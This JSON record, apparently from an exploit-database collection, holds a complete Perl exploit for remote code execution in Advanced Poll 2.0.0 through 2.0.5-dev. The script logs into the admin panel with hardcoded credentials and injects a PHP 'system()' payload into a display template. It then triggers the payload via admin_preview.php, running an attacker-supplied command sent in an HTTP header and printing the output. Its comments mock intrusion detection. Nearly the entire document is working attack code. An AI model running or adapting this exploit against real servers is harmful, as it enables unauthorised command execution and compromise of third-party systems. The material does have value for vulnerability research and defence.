{
  "id": "3300",
  "title": "Advanced Poll 2.0.5-dev - Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl -w\r\n# Advanced Poll 2.0.0 >= 2.0.5-dev textfile RCE.\r\n#\r\n# date: 30/07/06\r\n# \r\n# diwou <diwou@phucksys.org>\r\n#\r\n# PHCKSEC (c) 2001-2006.\r\n#\r\n# Hey, what a mad world!\r\n#\r\n\r\nuse strict;\r\nuse warnings;\r\nuse LWP::UserAgent;\r\nuse MD5;\r\n\r\n#\r\n# args: http://url/apoll_path cmd\r\n#\r\n# proxy: export PROXY='http|https://www.my.big.and.famous.proxy:8080/'\r\n# url: http|https://tatget:(port)/phppoll/\r\n#\r\n\r\ndie(\"RTFC! ;)\") unless(@ARGV>1);\r\n\r\nmy ($lwp,$agent,$out,$res,$url,$cmd)=(undef,undef,undef,undef,$ARGV[0],$ARGV[1]);\r\n\r\nmy %ipost=\r\n(\r\n\tpoll_tplset => 'default',\r\n\t'tpl[display_head.html]' =>\r\n<<HEAD\r\n\\\\\".system(getenv(HTTP_PHP)).exit().\\\\\"\r\n<table width=\"\\$pollvars[table_width]\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\" bgcolor=\"\\$pollvars[bgcolor_fr]\">\r\n  <tr align=\"center\">\r\n    <td><style type=\"text/css\">\r\n       <!--\r\n        .input { font-family: \\$pollvars[font_face]; font-size: 8pt}\r\n        .links { font-family: \\$pollvars[font_face]; font-size: 7.5pt; color: \\$pollvars[font_color]}\r\n       -->\r\n      </style><font face=\"\\$pollvars[font_face]\" size=\"-1\" color=\"#FFFFFF\"><b>\\$pollvars[title]</b></font></td>\r\n  </tr>\r\n  <tr align=\"center\">\r\n    <td>\r\n      <table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\" align=\"center\" bgcolor=\"\\$pollvars[bgcolor_tab]\">\r\n        <tr>\r\n          <td height=\"40\" valign=\"middle\"><font face=\"\\$pollvars[font_face]\" color=\"\\$pollvars[font_color]\" size=\"1\"><b>\\$question</b></font></td>\r\n        </tr>\r\n        <tr align=\"right\" valign=\"top\">\r\n          <td>\r\n            <form method=\"post\" action=\"\\$this->form_forward\">\r\n            <table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">\r\n              <tr valign=\"top\" align=\"center\">\r\n                <td>\r\n                  <table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\" align=\"center\">\r\nHEAD\r\n,\r\n\taction   =>  '',\r\n\ttplset   =>  'default',\r\n\ttpl_type =>  'display',\r\n\tsession  =>  '',\r\n\tuid      =>  1\r\n);\r\n\r\nmy %epost=\r\n(\r\n\tsession    => '',\r\n\tuid        => 1,\r\n\tpoll_tplst => 'default',\r\n\ttpl_type   => 'display',\r\n);\r\n\r\nmy %zday=\r\n(\r\n\tusername => 'jakahw4nk4h',\r\n\t'pollvars[poll_username]' => 'jakahw4nk4h',\r\n\tpassword => 'fuckoff',\r\n\t'pollvars[poll_password]' => ''\r\n);\r\n\r\n$zday{'pollvars[poll_password]'}=&md5($zday{password});\r\n$agent=\"Hey IDS! i'm gonna fuck your advanced poll right? B===D\"; # post method doesnt log it, so doesnt matter.\r\n#$agent=\"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1\";\r\n\r\n$lwp=new LWP::UserAgent();\r\n$lwp->agent($agent);\r\n$lwp->timeout(10);\r\n$lwp->protocols_allowed(['http','https']);\r\n\r\nif($ENV{PROXY})\r\n{\r\n\t$lwp->proxy(['http','https'],$ENV{PROXY});\r\n\tprint \"Using proxy \".$ENV{PROXY}.\"\\n\";\r\n}\r\n\r\n$url.=\"/\" if($url!~/\\/$/);\r\n$url.=\"admin/index.php\";\r\nprint \"Doing some pretty with \".$url.\"...\\n\\n\";\r\n\r\nprint \"+ generating session...\\n\";\r\n$out=$lwp->post($url,\\%zday)->content();\r\nif($out=~ /index\\.php\\?session=((.){32})/)\r\n{\r\n\t$ipost{'session'}=$epost{'session'}=$1;\r\n\tprint \"  session: \".$ipost{'session'}.\"\\n\";\r\n\t\r\n\t$url=~s/index\\.php/admin_templates\\.php/g;\r\n\tprint \"+ injecting diplay_head.html template...\\n\";\r\n\t$out=$lwp->post($url,\\%ipost)->content();\r\n\t$epost{'action'}=$1 if($out=~ /<input type=\"submit\" name=\"action\" value=\"(.*)\" class=\"button\">/);\r\n\tprint \"  button: \".$epost{'action'}.\"\\n\";\r\n\r\n\t$url=~s/admin_templates\\.php/admin_preview\\.php/g;\r\n\tprint \"+ executing...\\n\";\r\n\t$out=$lwp->post($url,\\%epost,PHP => \"echo BOCE;\".$cmd.\";echo EOCE\")->content();\r\n\r\n\tprint \"-- BOCE --\\n\";\r\n\tforeach $out (split(/\\n/,$out))\r\n\t{\r\n\t\t$res=1,next if($out=~/BOCE/);\r\n\t\t$res=0,next if($out=~/EOCE/);\r\n\t\tprint $out.\"\\n\" if($res);\r\n\t}\r\n\tprint \"-- EOCE --\\n\";\r\n}\r\nelse\r\n{\r\n\tprint \"don't worry, u can improve me! eh eh eh :D?\\n\";\r\n}\r\n\r\nsub md5\r\n{\r\n\t$_=new MD5;\r\n\t$_->add(@_);\r\n\treturn unpack(\"H*\",$_->digest());\r\n}\r\n\r\n# milw0rm.com [2007-02-13]",
  "url": "https://www.exploit-db.com/exploits/3300"
}